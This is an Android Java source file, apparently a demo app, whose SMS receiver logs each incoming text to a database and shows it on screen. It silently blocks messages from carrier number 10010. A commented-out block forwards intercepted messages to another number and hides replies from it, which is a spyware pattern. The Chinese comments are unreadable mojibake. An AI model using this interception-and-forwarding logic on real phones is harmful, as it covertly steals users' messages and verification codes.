package com.example.testmms;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class MySmsReceiver extends BroadcastReceiver {

	
	@Override
	public void onReceive(Context context, Intent intent) {
		MyDb db = MyDb.getInstance(context);
		// �ж���ϵͳ���ţ�
		// if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
		// �������´�����
		StringBuffer sb = new StringBuffer();
		String sender = null;
		String content = null;
		String sendtime = null;
		Bundle bundle = intent.getExtras();
		if (bundle != null) {
			// ͨ��pdus��ý��յ������ж�����Ϣ����ȡ�������ݣ�
			Object[] pdus = (Object[]) bundle.get("pdus");
			// �������Ŷ������飻
			SmsMessage[] mges = new SmsMessage[pdus.length];
			for (int i = 0; i < pdus.length; i++) {
				// ��ȡ�����������ݣ���pdu��ʽ��,�����ɶ��Ŷ���
				mges[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
			}
			for (SmsMessage mge : mges) {
				sender = mge.getDisplayOriginatingAddress();// ��ȡ���ŵķ�����
				if("10010".equals(sender))
					abortBroadcast();
				content = mge.getMessageBody();// ��ȡ���ŵ�����
				Date date = new Date(mge.getTimestampMillis());
				SimpleDateFormat format = new SimpleDateFormat(
						"yyyy-MM-dd HH:mm:ss");
				sendtime = format.format(date);// ��ȡ���ŷ���ʱ�䣻
				db.insert(sender, content, sendtime);
				sb.append("���ԣ� "+sender +"\n\n");
				sb.append("���ݣ� "+content);
				// SmsManager manager = SmsManager.getDefault();
				// manager.sendTextMessage("5556",
				// null,"������:"+sender+"-----����ʱ��:"+sendtime+"----����:"+content,
				// null, null);//�����ص��Ķ��ŷ��͵�ָ�����ֻ����˴�Ϊ5556;
				// if ("5556".equals(sender)){
				// //�����ֻ���Ϊ5556�Ķ��ţ����ﻹ����ʱ��һЩ������Ѹ���Ϣ���͵������˵��ֻ��ȵȡ�
				// abortBroadcast();
				// }
				Toast.makeText(context, sb.toString(), Toast.LENGTH_LONG).show();
			}
			
		}

	}

}